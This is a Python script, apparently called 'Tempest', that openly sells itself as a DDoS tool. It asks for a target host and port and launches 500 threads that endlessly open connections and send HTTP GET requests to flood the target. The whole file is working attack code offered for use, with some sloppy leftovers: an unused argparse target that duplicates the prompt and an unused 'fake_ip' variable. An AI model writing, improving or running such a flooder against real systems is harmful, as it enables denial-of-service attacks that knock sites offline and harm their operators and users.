import argparse
import socket
import threading
import re

# ASCII art for startup
ascii_art = """
 _________  _______   _____ ______   ________  _______   ________  _________   
|\\___   ___\\\\  ___ \\ |\\   _ \\  _   \\|\\   __  \\|\\  ___ \\ |\\   ____\\|\\___   ___\\ 
\\|___ \\  \\_\\ \\   __/|\\ \\  \\\\\\__\\ \\  \\ \\  \\|\\  \\ \\   __/|\\ \\  \\___|\\|___ \\  \\_| 
     \\ \\  \\ \\ \\  \\_|/_\\ \\  \\\\|__| \\  \\ \\   ____\\ \\  \\_|/_\\ \\_____  \\   \\ \\  \\  
      \\ \\  \\ \\ \\  \\_|\\ \\ \\  \\    \\ \\  \\ \\  \\___|\\ \\  \\_|\\ \\|____|\\  \\   \\ \\  \\ 
       \\ \\__\\ \\ \\_______\\ \\__\\    \\ \\__\\ \\__\\    \\ \\_______\\____\\_\\  \\   \\ \\__\\
        \\|__|  \\|_______|\\|__|     \\|__|\\|__|     \\|_______|\\_________\\   \\|__|
                                                           \\|_________|         
"""

# Function to validate input as IP address or domain name
def validate_input(input_str):
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'  # Regex pattern for IP address
    if re.match(ip_pattern, input_str):
        return 'ip', input_str
    else:
        return 'domain', input_str

# Prompt user for target IP or domain and port
print("Enter the target IP address or domain name and port to launch the DDoS attack.")
user_target = input("Target (IP or domain): -> ")
user_port = input("Port (default is 80): -> ")

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Simple DDoS script for targeting a website or IP address.')
parser.add_argument('target', metavar='TARGET', type=str, help='Target website URL or IP address')
parser.add_argument('-p', '--port', metavar='PORT', type=int, default=80, help='Port number (default is 80)')
args = parser.parse_args()

# Print ASCII art on script startup
print(ascii_art)

# Validate input and resolve domain name if necessary
input_type, target = validate_input(user_target)
port = int(user_port) if user_port else 80  # Convert port to integer, default to 80 if empty
fake_ip = '127.0.0.1'  # Your fake IP address for the attack

def ddos():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
            s.sendto((f"GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto((f"Host: {target}\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except socket.error as e:
            print(f"Error connecting to {target}:{port}: {e}")

# Launch DDoS attack threads
print(f"Launching DDoS attack on {target} port {port}...")
for i in range(500):  # Number of threads to create for the attack
    ddos_thread = threading.Thread(target=ddos)
    ddos_thread.start()